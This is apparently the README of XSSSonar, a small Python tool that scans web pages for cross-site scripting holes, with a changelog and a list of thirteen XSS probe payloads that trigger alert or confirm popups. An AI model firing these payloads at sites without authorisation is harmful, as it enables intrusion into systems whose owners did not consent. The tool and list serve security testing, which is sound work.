# XSSSonar

Little tool to look for XSS vulnerabilities in a web page.

![XSS Sonar Screenshot](xsssonar.png)

## Info

This code is just a draft. There are some errors still to be corrected, and sometimes false positives occur.<br/>
Test with Python 2.7.9 on Debian Jessie. I'll write it for Python 3.x maybe.<br/>

## ChangeLog

<strong>0.1.6</strong><br/>
[-] Fixed some bugs<br/>
[-] Added scan on list of POST parameters<br/>
[-] Added option to assign default value to a POST parameter<br/>
[-] Added help function<br/>
<br/>
<strong>0.1.5a</strong><br/>
[-] Fixed some bugs<br/>
[-] Less than 400 lines of code<br/>
<br/>
<strong>0.1.5</strong><br/>
[-] Added scan on POST parameters<br/>
[-] Changed name<br/>
<br/>
<strong>0.1.4a</strong><br/>
[-] Added stopwatch to know the time spent to check each URL<br/>
[-] Same features with 1500 lines of code missing<br/>
<br/>
<strong>0.1.4</strong><br/>
[-] Check a single URL or a list.txt of sites

## List of XSS Payloads

    '">"'><img src=x onerror=confirm`XSS`>
    "> <script>alert`XSS`</script>
    '">"'><svg onload=confirm`XSS`>
    "',;</script><script>confirm`XSS`</script>
    '><svg onload=confirm`XSS`>
    "><svg/onload=confirm`XSS`//
    "><details/open/ontoggle=confirm`XSS`>
    " onfocus="confirm`XSS`" autofocus=""
    " onclick="confirm`XSS`"
    " onmouseover="confirm`XSS`"
    \"-confirm`XSS`//
    \'-confirm`XSS`//
    "-confirm`XSS`-"'-confirm`XSS`-'

## To start

pip install fake-useragent<br/>
python xsssonar.py
